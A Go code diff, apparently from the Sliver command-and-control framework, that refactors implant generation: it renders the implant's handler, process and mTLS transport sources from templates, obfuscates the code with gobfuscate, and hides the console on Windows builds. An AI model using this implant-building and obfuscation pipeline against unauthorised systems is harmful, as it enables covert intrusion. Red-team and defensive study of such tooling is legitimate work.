@@ -102,17 +102,29 @@ func GenerateImplantBinary(goos string, goarch string, server string, lport uint
 	// Load code template
 	sliverBox := packr.NewBox("../sliver")
 
-	unpackCode(sliverBox, sliverPkgDir)
-
-	sliverGoCode, _ := sliverBox.FindString("sliver.go")
-	sliverCodePath := path.Join(sliverPkgDir, "sliver.go")
-	fSliver, _ := os.Create(sliverCodePath)
-	log.Printf("Rendering sliver code to: %s", sliverCodePath)
-	sliverCodeTmpl, _ := template.New("sliver").Parse(sliverGoCode)
-	err := sliverCodeTmpl.Execute(fSliver, config)
-	if err != nil {
-		log.Printf("Failed to render go code: %v", err)
-		return "", err
+	srcFiles := []string{
+		"handlers.go",
+		"handlers_windows.go",
+		"handlers_linux.go",
+		"handlers_darwin.go",
+		"ps.go",
+		"ps_windows.go",
+		"ps_linux.go",
+		"ps_darwin.go",
+		"tcp-mtls.go",
+		"sliver.go",
+	}
+	for _, fileName := range srcFiles {
+		sliverGoCode, _ := sliverBox.FindString(fileName)
+		sliverCodePath := path.Join(sliverPkgDir, fileName)
+		fSliver, _ := os.Create(sliverCodePath)
+		log.Printf("Rendering sliver code to: %s", sliverCodePath)
+		sliverCodeTmpl, _ := template.New("sliver").Parse(sliverGoCode)
+		err := sliverCodeTmpl.Execute(fSliver, config)
+		if err != nil {
+			log.Printf("Failed to render go code: %v", err)
+			return "", err
+		}
 	}
 
 	// Compile go code
@@ -127,7 +139,7 @@ func GenerateImplantBinary(goos string, goarch string, server string, lport uint
 	if !debug {
 		log.Printf("Obfuscating source code ...")
 		obfuscatedGoPath := path.Join(projectGoPathDir, "obfuscated")
-		obfuscatedPkg, err := gobfuscate.Gobfuscate(goConfig, randomEncryptKey(), "sliver", obfuscatedGoPath)
+		obfuscatedPkg, err := gobfuscate.Gobfuscate(goConfig, randomObfuscationKey(), "sliver", obfuscatedGoPath)
 		if err != nil {
 			log.Printf("Error while obfuscating sliver %v", err)
 			return "", err
@@ -147,39 +159,8 @@ func GenerateImplantBinary(goos string, goarch string, server string, lport uint
 	if !debug && goConfig.GOOS == "windows" {
 		ldflags[0] += " -H=windowsgui"
 	}
-	_, err = gogo.GoBuild(goConfig, sliverPkgDir, dest, tags, ldflags)
+	_, err := gogo.GoBuild(goConfig, sliverPkgDir, dest, tags, ldflags)
 	return dest, err
-}
-
-func unpackCode(sliverBox packr.Box, sourceDir string) error {
-	srcFiles := []string{
-		"handlers.go",
-		"handlers_windows.go",
-		"handlers_linux.go",
-		"handlers_darwin.go",
-		"ps.go",
-		"ps_windows.go",
-		"ps_linux.go",
-		"ps_darwin.go",
-	}
-	for _, fileName := range srcFiles {
-		err := saveCode(sliverBox, fileName, sourceDir)
-		if err != nil {
-			return err
-		}
-	}
-	return nil
-}
-
-func saveCode(sliverBox packr.Box, fileName string, sourceDir string) error {
-	sliverPlatformCode, _ := sliverBox.FindString(fileName)
-	sliverPlatformCodePath := path.Join(sourceDir, fileName)
-	err := ioutil.WriteFile(sliverPlatformCodePath, []byte(sliverPlatformCode), os.ModePerm)
-	if err != nil {
-		log.Printf("Error writing file %s: %s", sliverPlatformCodePath, err)
-		return err
-	}
-	return nil
 }
 
 func getObfuscatedSliverPkgDir(obfuscatedDir string) (string, error) {
@@ -199,7 +180,7 @@ func getObfuscatedSliverPkgDir(obfuscatedDir string) (string, error) {
 	return "", errors.New("no sliver files found")
 }
 
-func randomEncryptKey() string {
+func randomObfuscationKey() string {
 	randBuf := make([]byte, 64) // 64 bytes of randomness
 	rand.Read(randBuf)
 	digest := sha256.Sum256(randBuf)
